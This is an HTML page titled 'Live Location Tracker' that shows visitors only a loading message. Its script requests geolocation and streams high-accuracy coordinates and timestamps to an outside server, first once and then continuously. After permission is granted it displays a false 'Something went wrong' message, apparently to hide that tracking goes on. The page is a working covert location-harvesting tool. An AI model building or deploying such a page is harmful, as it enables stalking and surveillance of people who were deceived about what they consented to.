<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Live Location Tracker</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
      background-color: #f0f2f5;
    }
    h2 {
      color: #333;
    }
    #loading {
      color: #555;
      font-size: 16px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <p id="loading">Please wait...</p>

  <script>
    function sendLocation(position) {
      const { latitude, longitude } = position.coords;
      const timestamp = new Date().toISOString();

      fetch("https://location-tracker-balt.onrender.com/receive-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude, longitude, timestamp })
      })
      .catch(() => {
        console.log("Failed to fetch location");
      });
    }

    function handleError(error) {
      document.body.innerHTML = `<h2>Location access denied: ${error.message}</h2>`;
    }

    function startLiveTracking() {
      navigator.geolocation.watchPosition(sendLocation, handleError, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 5000
      });
    }

    if (navigator.geolocation) {
      // First request one-time permission
      navigator.geolocation.getCurrentPosition(
        (position) => {
          sendLocation(position);
          startLiveTracking();
          document.getElementById("loading").innerText = "Something went wrong. Please try again...";
        },
        handleError
      );
    } else {
      document.body.innerHTML = "<h2>Your browser doesn't support geolocation.</h2>";
    }
  </script>
</body>
</html>
